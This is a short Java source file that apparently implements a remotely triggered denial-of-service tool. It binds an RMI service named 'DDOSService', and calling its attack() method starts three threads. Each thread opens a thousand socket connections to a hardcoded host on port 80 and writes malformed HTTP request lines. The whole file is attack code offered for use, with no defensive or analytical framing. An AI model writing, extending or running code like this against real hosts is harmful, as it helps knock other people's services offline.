import java.math.*;
import java.rmi.*;
import java.rmi.server.*;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.net.UnknownHostException;

public class DDOSServiceServer extends UnicastRemoteObject implements Runnable, DDOSService
{
	final String TARGET = "will-pc";
	static DDOSServiceServer _instance;
	public DDOSServiceServer () throws RemoteException
	{
		super();
	}
	public String attack()
		throws RemoteException
	{
		_instance = new DDOSServiceServer ();
		for(int i= 0;i<= 2; i++)
			new Thread(_instance).start();
		String attack;

		attack="Attacking:"+TARGET;
		return attack;
	}
	
	public void run() {

		for(int i = 1; i<= 1000; i++){
			try {
				Socket net = new Socket (TARGET, 80);
				sendRawLine("GET /HTTP/1.1",net);
				sendRawLine("Host: "+ TARGET, net);
				System.out.println("Attacking on Target "+ TARGET+"with Connection #: " +i);
			} catch (UnknownHostException e){
				System.out.println("DDos.run: "+ e);}
			catch (IOException e){System.out.println("DDos.run:" +e);}
		}
	}

	public static void main (String args[])throws Exception
	{
		DDOSServiceServer svr = new DDOSServiceServer();
		Naming.bind ("DDOSService",svr);
		System.out.println ("Service bound....");
	}
	public static void sendRawLine(String text, Socket sock){
		try {
			BufferedWriter out = new BufferedWriter (new OutputStreamWriter(sock.getOutputStream()));
			out.write(text + "");
			out.flush();
		}catch (IOException ex){
			ex.printStackTrace();
		}}}


